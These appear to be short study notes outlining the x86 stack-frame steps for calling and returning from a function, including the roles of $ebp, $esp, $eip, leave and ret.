Calling Functions
---------------------------
- Push arguments onto stack
- Push return address
- Set $eip to destination
- Save $ebp on stack
- Change $ebp to point to saved $ebp on stack
- Make space for locals


Returning:
- Put return value into $eax
- leave instruction
	- Set $esp to $ebp (pop everything but $ebp)
	- Pop $ebp (into $ebp, restoring the old base pointer)
- ret instruction
	- Pops $esp (return address) into $eip

Note that on returning, we don't pop the arguments to the called function!
